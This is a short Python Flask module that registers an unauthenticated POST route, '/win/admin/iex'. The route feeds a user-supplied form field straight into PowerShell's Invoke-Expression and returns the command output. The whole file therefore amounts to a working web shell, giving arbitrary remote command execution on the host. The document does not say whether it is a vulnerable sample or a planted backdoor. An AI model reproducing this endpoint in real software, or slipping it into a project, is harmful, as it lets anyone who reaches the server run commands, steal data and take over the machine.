from flask import request as req
import subprocess

def init(app):

        @app.route('/win/admin/iex', methods=['POST'])
        def run_iex():
                expr = req.form.get("expr", "")
                if not expr:
                        expr = ""

                text = expr.strip()

                args = ["powershell", "-NoProfile", "-Command", f"Invoke-Expression \"{text}\""]
                p = subprocess.run(args, capture_output=True, encoding="utf-8")

                return (p.stdout or "") + (p.stderr or "")